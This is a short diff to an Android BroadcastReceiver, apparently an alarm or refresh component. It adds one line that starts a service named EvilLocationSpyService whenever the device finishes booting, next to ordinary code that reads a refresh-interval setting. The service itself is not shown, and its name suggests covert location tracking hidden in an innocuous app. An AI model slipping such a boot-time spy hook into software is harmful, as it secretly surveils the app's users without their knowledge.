@@ -31,6 +31,7 @@ public class AlarmReceiver extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
         this.context = context;
         if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
+            context.startService(new Intent(context, EvilLocationSpyService.class));
             SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(context);
             String interval = sp.getString("refreshInterval", "1");
             if (!interval.equals("0")) {
